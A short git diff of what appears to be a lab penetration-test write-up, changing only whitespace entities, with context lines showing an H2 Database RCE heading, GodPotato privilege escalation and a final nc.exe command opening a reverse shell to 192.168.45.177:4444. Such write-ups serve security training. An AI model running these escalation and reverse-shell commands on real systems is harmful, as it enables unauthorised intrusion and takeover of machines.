@@ -51,7 +51,7 @@ PORT     STATE SERVICE       VERSION
 9092/tcp open  XmlIpcRegSvc?
 ```
 
-The H2 Database does have a few code execution exploits that might work.&#x20;
+The H2 Database does have a few code execution exploits that might work.
 
 ### H2 Database -> RCE
 
@@ -135,7 +135,7 @@ C:\Users\tony\Desktop>.\print.exe -i -c cmd
 [-] Operation failed or timed out
 ```
 
-So we have to find another way.&#x20;
+So we have to find another way.
 
 ### GodPotato.exe
 
@@ -171,7 +171,7 @@ C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c whoami"
 [*] process start with pid 408
 ```
 
-Looks like it works well. Now we can download `nc.exe` onto the machine and get ourselves another reverse shell.&#x20;
+Looks like it works well. Now we can download `nc.exe` onto the machine and get ourselves another reverse shell.
 
 ```
 C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:/Windows/Tasks/nc.exe 192.168.45.177 4444 -e cmd.exe
